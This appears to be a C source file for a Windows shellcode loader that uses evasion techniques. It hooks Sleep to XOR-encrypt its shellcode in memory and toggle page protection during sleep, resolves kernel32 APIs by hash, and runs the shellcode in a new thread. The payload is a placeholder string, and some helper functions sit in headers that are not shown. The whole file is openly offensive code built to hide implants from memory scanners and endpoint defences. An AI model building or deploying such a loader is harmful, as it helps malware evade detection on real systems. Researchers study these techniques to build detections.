//
// xOR sleeping and shellcode fluctuation, functionhashed
//
#include <Windows.h>
#include <stdio.h>
#include "minhook/include/MinHook.h"
#include "HashyHashy.h"
#include "TypeDef.h"
#include "needle.h"

char XORKey[] = "sleepylogan";
unsigned char buf[] = "1337shellcode";
LPVOID g_sleepyfuncptr;
LPVOID g_vpPtr;
LPVOID g_vaPtr;
LPVOID g_wpmPtr;
LPVOID g_ctrPtr;
DeepSleep sleepy = NULL;
LPVOID g_baseAddr;
SIZE_T g_bufferSize = sizeof(buf);

VOID WINAPI DetourSleep(DWORD dwMiliSeconds)
{
	//only do it when sleep time is bigger than 4 seconds
	if (dwMiliSeconds > 4000)
	{

		//printf_s("Sleep timer: %lu \n", dwMiliSeconds);
		//MessageBoxA(NULL, "sleepy?", "deepsleep", MB_OK);
		ChangeMemProtection(g_baseAddr, g_bufferSize, PAGE_READWRITE);
		XORData(g_baseAddr, XORKey, g_bufferSize);
		sleepy(dwMiliSeconds);
		XORData(g_baseAddr, XORKey, g_bufferSize);
		ChangeMemProtection(g_baseAddr, g_bufferSize, PAGE_EXECUTE_READ);
	}
	//MessageBoxA(NULL, "Wake up Neo...", "deepsleep", MB_OK);
}

int main()
{
	if (MH_Initialize() != MH_OK)
	{
		return 1;
	}
	g_sleepyfuncptr = getHashedFunctionPointer("kernel32", "Sleep");
	g_vpPtr = getHashedFunctionPointer("kernel32", "VirtualProtect");
	g_vaPtr = getHashedFunctionPointer("kernel32", "VirtualAlloc");
	g_wpmPtr = getHashedFunctionPointer("kernel32", "WriteProcessMemory");
	g_ctrPtr = getHashedFunctionPointer("kernel32", "CreateThread");

	if (MH_CreateHook(g_sleepyfuncptr, &DetourSleep, (LPVOID*)&sleepy) != MH_OK)
	{
		return 1;
	}
	if (MH_EnableHook(g_sleepyfuncptr) != MH_OK)
	{
		return 1;
	}
	HANDLE scHandle = CreateShellCodeThread(buf, g_bufferSize, GetCurrentProcess());
	printf_s("shellcode lives at %p\n", g_baseAddr);
	WaitForSingleObject(scHandle, INFINITE);
	return 0;
}

